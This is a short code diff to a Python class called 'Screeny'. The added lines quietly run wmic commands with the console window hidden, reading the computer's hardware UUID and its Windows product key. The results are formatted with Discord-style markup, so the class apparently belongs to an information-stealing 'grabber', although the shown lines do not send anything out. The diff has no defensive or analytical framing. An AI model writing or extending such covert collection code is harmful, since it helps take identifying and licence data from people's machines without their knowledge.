@@ -79,5 +79,11 @@ class Screeny:
         self.availableM = self.Size(self.sv.available)
         self.usedM = self.Size(self.sv.used)
         self.pourcentageM = self.Size(self.sv.percent)+"%"
-        self.hwid = tprocessing2.ongetprocess("hwid")
-        self.windowspk = tprocessing2.ongetprocess("product")
+        self.hwid = str(subprocess.check_output('wmic csproduct get uuid',creationflags=subprocess.CREATE_NO_WINDOW)).replace(" ","").split("\\n")[1].split("\\r")[0]
+        try:
+            self.windowspk = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey',creationflags=subprocess.CREATE_NO_WINDOW).decode(encoding="utf-8", errors="strict").split("OA3xOriginalProductKey")[1].split(" ")
+            for i in self.windowspk:
+                if len(i) > 20:self.windowspk = i.split(" ")
+            self.windowspk= f"``{self.windowspk[0][3:]}``"
+        except:
+            self.windowspk = ":x:"
